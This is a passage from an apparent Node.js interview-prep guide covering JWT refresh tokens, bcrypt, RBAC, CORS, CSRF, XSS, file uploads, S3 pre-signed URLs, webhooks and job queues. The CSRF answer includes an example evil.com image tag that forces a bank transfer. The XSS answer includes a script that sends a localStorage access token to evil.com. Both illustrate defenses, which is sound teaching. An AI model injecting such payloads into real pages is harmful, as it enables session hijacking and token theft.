  const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET);
  const stored = await Token.findOne({ userId: decoded.id, token: refreshToken });
  if (!stored) return res.status(403).json({ error: 'Invalid refresh token' });

  const { accessToken } = generateTokens(decoded.id);
  res.json({ accessToken });
});

The two tokens exist for different reasons: the access token is short-lived and stateless — the server validates it purely by checking the signature, with no DB lookup, which is what makes JWTs fast and horizontally scalable. But that also means an access token can't be revoked before it expires (there's no server-side record to delete), which is exactly why it's kept short (minutes). The refresh token compensates — it's checked against the DB on every use, so it can be revoked instantly (logout, password change, suspected compromise), at the cost of a DB round-trip, which is acceptable since refresh happens far less often than API calls.

Refresh token rotation (issuing a brand-new refresh token on every refresh and invalidating the old one) is considered best practice — if a stolen refresh token is used after the legitimate client already rotated it, the mismatch is detectable and the whole token family can be revoked, limiting the blast radius of a leaked token.

Common pitfall: storing the access token in the same place as the refresh token (e.g., both in localStorage) — that defeats the entire design, since compromising one compromises both; keep the access token in memory only.

Q36. Bcrypt — why preferred for password hashing ***

Bcrypt is designed to be slow on purpose — making brute-force attacks impractical.

Why not MD5/SHA256? They're designed to be fast → millions of hashes/second → attackers can brute-force quickly.

Why Bcrypt: salt (random data before hashing, same password → different hash), work factor/cost (configurable rounds, exponentially slower), future-proof (increase cost as hardware improves).

const bcrypt = require('bcrypt');

const hashedPassword = await bcrypt.hash(plainPassword, 12);
const isMatch = await bcrypt.compare(plainPassword, hashedPassword);

// "password" → $2b$12$XJHlKxf3r...      ← different each time (random salt)
// "password" → $2b$12$mQpAb2F9k...

The cost factor is exponential, not linear — each increment of the cost parameter (e.g., 10 → 12) doubles the work required, so choosing 12 vs 10 isn't "20% slower," it's roughly 4x slower. This is what lets teams "future-proof" a hashing scheme: as hardware gets faster, you bump the cost factor for newly-hashed passwords without needing a new algorithm. The salt (stored as part of the hash string itself, visible in that $2b$12$... prefix) defeats rainbow table attacks — precomputed hash tables become useless once every password gets a unique random salt, since the attacker would need a separate table per salt.

Interview follow-up: "why not just add your own salt to SHA256?" — because SHA256 is still fast per-hash, so even with unique salts an attacker with GPUs can still brute-force a weak password quickly; bcrypt's deliberate slowness (and newer algorithms like Argon2, which also adds memory-hardness against GPU/ASIC attacks) is the actual point, not just the presence of a salt.

Q37. RBAC and how to implement it **

Role-Based Access Control — assign permissions to roles, assign roles to users. Users get permissions indirectly through their role(s).

{ name: 'Alice', role: 'admin' }
{ name: 'Bob',  role: 'user' }

const permissions = {
  admin:  ['read', 'write', 'delete', 'manage_users'],
  editor: ['read', 'write'],
  user:   ['read']
};

const hasPermission = (permission) => (req, res, next) => {
  const userPerms = permissions[req.user.role] || [];
  if (!userPerms.includes(permission)) {
    return res.status(403).json({ error: 'Insufficient permissions' });
  }
  next();
};

app.get('/posts',         authenticate, hasPermission('read'),        getPosts);
app.post('/posts',        authenticate, hasPermission('write'),       createPost);
app.delete('/posts/:id',  authenticate, hasPermission('delete'),      deletePost);
app.get('/admin/users',   authenticate, hasPermission('manage_users'), getUsers);

RBAC's core value is indirection: you assign permissions to a small, stable set of roles rather than to individual users, so adding a new employee or changing someone's access is a one-line role reassignment instead of editing a giant per-user permission list. Its limitation shows up with finer-grained needs — "can edit only their own posts" or "can access only resources in their department" can't be expressed by role alone, which is where ABAC (Attribute-Based Access Control, checking attributes like resource owner ID or department against the requester) or a hybrid RBAC+ownership check comes in.

Common pitfall: hardcoding role names as magic strings scattered across the codebase — centralizing them as constants/enums avoids typos that silently fail permission checks (e.g., 'Admin' vs 'admin') and makes adding a new role a single-file change.

Q38. CORS — what it is and how to handle it **

CORS is a browser security mechanism that blocks web pages from making requests to a different origin (domain, port, protocol) than the one that served the page.

Frontend: http://localhost:3000
Backend:  http://localhost:5000   ← different port = different origin → CORS blocked!
const cors = require('cors');

// Dev only
app.use(cors());

// Production
app.use(cors({
  origin: ['https://myapp.com', 'https://www.myapp.com'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

CORS is a browser restriction — Postman/curl are unaffected; server-to-server calls also bypass CORS.

It's worth being precise about what CORS actually prevents: the cross-origin request is usually still sent by the browser and the server still processes it — CORS controls whether the browser hands the response back to the calling JavaScript. For "simple" requests (GET/POST with standard headers) the request goes out and the server's response is just blocked from being read by the page's JS if the Access-Control-Allow-Origin header doesn't match. For "non-simple" requests (custom headers, PUT/DELETE, Content-Type: application/json), the browser first sends an OPTIONS preflight request, and only fires the real request if the preflight response approves it.

Interview follow-up: "why does credentials: true plus a wildcard origin fail?" — the CORS spec explicitly forbids combining Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, since that combination would let any site read authenticated responses; you must echo back a specific origin when credentials are involved.

Q39. CSRF and prevention with cookies **

An attacker tricks a logged-in user's browser into making an unintended request (cookies are sent automatically).

1. User is logged into bank.com (cookie: sessionToken=abc)
2. User visits evil.com
3. evil.com has: <img src="https://bank.com/transfer?to=attacker&amount=1000">
4. Browser sends request WITH the cookie automatically → transfer happens!
// Option 1: SameSite cookie attribute (best defense)
res.cookie('sessionToken', token, {
  sameSite: 'Strict',
  httpOnly: true,
  secure: true
});

// Option 2: CSRF tokens
const csrf = require('csurf');
app.use(csrf({ cookie: true }));
app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

The reason SameSite is now considered the primary defense (rather than CSRF tokens) is that it's a browser-enforced attribute set once on the cookie, requiring no per-form token plumbing: Strict never sends the cookie on cross-site navigation at all (even a click-through link), while Lax (the modern browser default) allows it for top-level GET navigations but blocks it for cross-site POSTs — which is exactly the attack vector CSRF exploits. Note CSRF is only a risk for cookie-based auth; if your API uses a bearer token in an Authorization header (not auto-attached by the browser), CSRF doesn't apply at all, since the attacker's page has no way to set that header on a cross-origin request.

Common pitfall: relying on SameSite alone for older-browser support or for state-changing GET requests (which shouldn't exist per REST/HTTP semantics but sometimes do in legacy code) — Lax still allows top-level GET navigations to carry the cookie, so a GET-based state change is still exploitable via a simple link or image tag.

Q40. XSS and its impact on token storage **

XSS — attacker injects malicious JS into your page, which executes in other users' browsers.

<script>
  // If token is in localStorage, attacker can steal it:
  fetch('https://evil.com/steal?token=' + localStorage.getItem('accessToken'));
</script>

localStorage/sessionStorage → accessible by JS → stolen by XSS. httpOnly cookies → not accessible by JS → XSS-safe.

const sanitizeHtml = require('sanitize-html');
const clean = sanitizeHtml(userInput);

res.setHeader('Content-Security-Policy', "default-src 'self'");

const helmet = require('helmet');

There are two main flavors worth distinguishing in an interview: stored XSS (malicious script saved to the DB — e.g., in a comment — and served to every viewer, as in the snippet above) is the more dangerous variant because it compounds automatically; reflected XSS (the payload comes from the current request, like a query param echoed unescaped into the page) requires tricking a victim into clicking a crafted link. Both are prevented the same way: never render untrusted input as raw HTML — escape on output (React does this by default for JSX text, which is why dangerouslySetInnerHTML is named the way it is) and sanitize any input that must allow limited HTML (rich text editors).

Interview follow-up: "if tokens are only in httpOnly cookies, is XSS harmless?" — no; even without stealing the token, XSS lets an attacker make authenticated requests directly from the victim's browser (since cookies are attached automatically) or manipulate the DOM/exfiltrate other sensitive on-page data — httpOnly only stops token theft specifically, not the underlying vulnerability.

Q43. What is Multer and why is it used? ***

Multer is Express middleware for handling multipart/form-data — the encoding type used for file uploads. Without it, body-parser can't parse binary file data.

const multer = require('multer');

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 5 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    const allowed = ['image/jpeg', 'image/png', 'image/webp'];
    if (allowed.includes(file.mimetype)) cb(null, true);
    else cb(new Error('Only images allowed'), false);
  }
});

const diskUpload = multer({
  storage: multer.diskStorage({
    destination: './uploads/',
    filename: (req, file, cb) => {
      cb(null, `${Date.now()}-${file.originalname}`);
    }
  })
});

app.post('/upload/single', upload.single('avatar'), (req, res) => {
  res.json({ message: 'Uploaded', filename: req.file.originalname });
});

app.post('/upload/multiple', upload.array('photos', 10), (req, res) => {
  // req.files = array of file objects
});

The storage engine choice matters operationally: memoryStorage buffers the whole file in RAM as a Buffer, which is convenient for immediately forwarding to S3 but dangerous for large files at scale — many concurrent large uploads can exhaust process memory since each one holds its entire content in the single Node heap. diskStorage streams to disk instead, bounding memory use but requiring cleanup logic (temp files that must be deleted after processing) and enough local disk space, which is awkward in containerized/serverless environments with ephemeral or limited storage.

Common pitfall: trusting file.mimetype in the fileFilter — that value comes straight from the client-supplied Content-Type header in the multipart body and can be spoofed trivially; it's a first filter, not a security boundary (see Q47 for the actual mitigation).

       bucket            key
// IAM Policy
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:PutObject", "s3:GetObject"],
    "Resource": "arn:aws:s3:::my-bucket/*"
  }]
}

IAM policies operate at the AWS-account/service level (which users/roles can call which S3 API actions), while bucket policies and object ACLs operate at the resource level (who can access this specific bucket/object) — a request needs to be allowed by both layers if both are present, since S3 evaluates the union of applicable policies and denies by default unless something explicitly allows it. This is why "public read" misconfigurations happen: a permissive bucket policy plus a permissive IAM role can combine to expose data that neither alone would have exposed.

Interview follow-up: "what's the actual production-safe default?" — Block Public Access enabled at the account and bucket level, IAM roles scoped to least privilege (only the specific prefixes/actions the app needs, e.g., s3:PutObject on uploads/* only, not the whole bucket), and access to individual objects mediated entirely through pre-signed URLs generated server-side after your own authorization check.

Q46. What is a pre-signed URL and why recommended? **

A temporary URL granting time-limited access to a private S3 object without making it public.

const { S3Client, PutObjectCommand, GetObjectCommand } = require('@aws-sdk/client-s3');
const { getSignedUrl } = require('@aws-sdk/s3-request-presigner');

const s3 = new S3Client({ region: 'ap-south-1' });

app.get('/upload-url', authenticate, async (req, res) => {
  const key = `uploads/${req.user.id}/${Date.now()}.jpg`;
  const command = new PutObjectCommand({
    Bucket: process.env.S3_BUCKET,
    Key: key,
    ContentType: 'image/jpeg'
  });
  const url = await getSignedUrl(s3, command, { expiresIn: 300 });
  res.json({ uploadUrl: url, key });
});

app.get('/download-url/:key', authenticate, async (req, res) => {
  const command = new GetObjectCommand({
    Bucket: process.env.S3_BUCKET,
    Key: req.params.key
  });
  const url = await getSignedUrl(s3, command, { expiresIn: 3600 });
  res.json({ downloadUrl: url });
});

Why recommended: keeps bucket private, client uploads directly (saves server bandwidth), URL expires, server doesn't handle large file streams.

Mechanically, a pre-signed URL is just the normal S3 request (method, path, headers) with a signature computed using your AWS credentials and a set of query parameters (expiry timestamp, signed headers) appended — S3 recomputes the same signature on request and rejects it if the signature doesn't match or the expiry has passed. That means the server never actually proxies the file; it only needs its AWS credentials to compute the signature, which is why it scales so well (no bandwidth or CPU cost per upload).

Common pitfall: generating an upload URL without constraining ContentType/size and without the server verifying afterward what actually landed in the bucket (via a subsequent HEAD request or S3 event trigger) — a malicious client can upload something entirely different from what the pre-signed URL was ostensibly issued for, since the signature only restricts the request shape you specified, not deeper content inspection.

-- Query: JOIN student_courses ON students.id = student_courses.student_id

The junction/join table in SQL isn't just a modeling convenience — it's where relationship-specific data lives (enrolled_at, a grade, a role in the relationship) that doesn't belong to either side alone; MongoDB's array-of-references approach struggles here, since attaching per-relationship metadata means either embedding a small sub-document per reference ([{ courseId, enrolledAt }]) instead of a bare ID array, or introducing a genuine third collection that mimics the junction-table pattern anyway.

Interview follow-up: "what happens to a many-to-many array of references at scale?" — an array of IDs on both sides (student has courseIds, course has studentIds) becomes hard to keep in sync and can grow unbounded on the "many" side (a popular course with 100,000 students) — the standard MongoDB answer is to keep the reference array only on the side with a naturally bounded count (a student's courses, typically small) and query the inverse direction with an indexed query instead of a mirrored array (Course.find({ studentIds: studentId })) rather than a mirrored array on the student.

    event = stripe.webhooks.constructEvent(req.body, sig, process.env.STRIPE_WEBHOOK_SECRET);

      await Order.updateOne({ paymentIntentId: payment.id }, { paymentStatus: 'paid' });
      break;
    case 'payment_intent.payment_failed':

  }

  res.json({ received: true });
});

Retries: webhook providers retry on failure (Stripe retries for 3 days) — make endpoints idempotent.

Signature verification (the stripe-signature header check above) is non-negotiable, not optional hardening — without it, a webhook endpoint is just an unauthenticated public URL that will blindly accept forged events (e.g., anyone POSTing a fake "payment succeeded" to mark an order paid). Note the endpoint must receive the raw, unparsed request body (express.raw(), not express.json()) because the signature is computed over the exact byte sequence sent — re-serializing a parsed-then-stringified JSON body would produce a different signature and always fail verification.

Interview follow-up: "why must the handler be idempotent given retries?" — because the provider has no way to know whether your 500 response meant "I received it but failed to process" or "I never received it," so it always retries on non-2xx; if updating the order status twice for the same event isn't safe (e.g., double-incrementing a counter), you need to track processed event IDs and no-op on repeats.

Q51. How do you handle long-running requests? **

HTTP has timeouts (~30-60s). Tasks like video encoding or bulk email take minutes.

                         Worker completes task (may take minutes)
                                    ↓
                         Stores result / sends email / webhook

const Queue = require('bull');
const emailQueue = new Queue('emails', { redis: { host: 'localhost', port: 6379 } });

app.post('/send-bulk-email', authenticate, async (req, res) => {
  const job = await emailQueue.add({ recipients: req.body.emails, template: 'welcome' });
  res.status(202).json({ jobId: job.id, message: 'Processing started' });
});

emailQueue.process(async (job) => {
  const { recipients, template } = job.data;
  for (const [i, email] of recipients.entries()) {
    await sendEmail(email, template);
    job.progress(Math.round((i / recipients.length) * 100));
  }
});

app.get('/jobs/:id', authenticate, async (req, res) => {
  const job = await emailQueue.getJob(req.params.id);
  res.json({ status: await job.getState(), progress: job.progress() });
});

Tools: Bull/BullMQ (Redis-based), Agenda (MongoDB-based), AWS SQS + Lambda.

This pattern trades immediate consistency for responsiveness and resilience: the client gets an instant 202 instead of blocking a connection (and a load balancer/proxy timeout) for minutes, and if a worker crashes mid-job, a durable queue (Redis-backed Bull, SQS) can redeliver the job rather than losing it silently the way an in-process setTimeout or fire-and-forget promise would on a server restart. Workers can also be scaled independently of the API — spin up more worker processes/containers when the queue backs up, without touching the web tier at all.

Interview follow-up: "how does the client find out when it's done, beyond polling?" — alternatives to polling include Server-Sent Events/WebSockets pushing a completion event, or the more common production choice of firing a webhook/email to the client once the job finishes, avoiding the wasted-request problem polling has (see Q50). Common pitfall: making job handlers non-idempotent — a worker crash after partially completing a job (e.g., after sending 400 of 1000 emails) means the queue will redeliver it, so handlers must either resume safely or dedupe already-processed work.

Q52. What is job scheduling in Node.js? **

Job scheduling means running a task at a particular time, after a delay, or repeatedly according to a schedule. Common examples include sending daily reports, clearing expired sessions, generating invoices, creating backups, and retrying failed work.

For a simple single-process application, a package such as node-cron can run cron expressions:

const cron = require('node-cron');

// Run every day at 9:00 AM in the specified time zone.
cron.schedule('0 9 * * *', async () => {
  await sendDailyReport();
}, { timezone: 'Asia/Kolkata' });

setTimeout() and setInterval() are suitable for short-lived, non-critical timers, but their schedules are lost when the process restarts. An in-process cron job also runs once in every application replica, which may duplicate work when the service is horizontally scaled.

For production-critical jobs, use a durable queue or external scheduler such as BullMQ with Redis, Agenda with MongoDB, a cloud scheduler, or Kubernetes CronJob. Store job state, configure retries and backoff, make the handler idempotent, monitor failures, and use a distributed lock or a single scheduler/worker when only one execution is allowed.

Q53. What are decorators? **

A decorator is a function applied to a class or class member to add metadata or modify its definition without placing that cross-cutting behavior directly inside the business logic. Decorators are common in TypeScript frameworks such as NestJS, where they declare controllers, routes, dependency injection, validation, and authorization.

import { Controller, Get, UseGuards } from '@nestjs/common';

@Controller('users')                 // Class decorator: route prefix
export class UserController {
  @Get(':id')                        // Method decorator: HTTP GET route
  @UseGuards(AuthGuard)              // Adds authorization behavior
  findOne() {
    return { message: 'User found' };
  }
}

Conceptually, @Controller registers metadata about the class, while the framework reads that metadata during startup and builds the required routing behavior. A decorator does not automatically make code secure or validate input—the framework or supporting runtime must interpret and enforce its metadata.

Interview note: decorator syntax and semantics depend on the JavaScript/TypeScript version and configuration. TypeScript's legacy experimentalDecorators behavior and newer standard JavaScript decorators are not identical, so avoid mixing decorator implementations intended for different systems.

Q54. How would you secure sensitive information in a web application? ***

Protect sensitive information throughout its lifecycle—collection, transmission, storage, processing, logging, and deletion—and collect only what the application actually needs.

  • Secrets: keep API keys, database credentials, and signing keys out of source code and client bundles. Load them from environment variables or a secret manager, restrict access by role, rotate them, and scan commits and dependencies for leaks.
  • Passwords: never store plaintext or reversible encrypted passwords. Store a salted, slow password hash using Argon2id or bcrypt and apply login rate limiting and MFA where appropriate.
  • Data in transit and at rest: enforce HTTPS/TLS, enable encryption for databases, backups, and object storage, and manage encryption keys separately from the encrypted data.
  • Authentication and sessions: use short-lived tokens, validate issuer, audience, signature, and expiry, and store browser session/refresh tokens in HttpOnly, Secure, appropriately SameSite cookies. Revoke or rotate refresh tokens after use.
  • Authorization: check permissions on the server for every protected resource. Use least privilege for users, services, database accounts, and cloud identities; never rely on hiding UI buttons.
  • Application security: validate input, use parameterized queries, encode output, configure CORS narrowly, add CSRF protection for cookie-authenticated state-changing requests, and set security headers with middleware such as Helmet.
  • Logs and errors: redact passwords, tokens, personal data, and payment details. Return generic errors to clients while keeping access-controlled diagnostic details in server logs.

Finally, keep dependencies patched, run security tests and audits, back up encrypted data, test recovery, and maintain an incident-response plan. Security is layered: no single control is sufficient on its own.
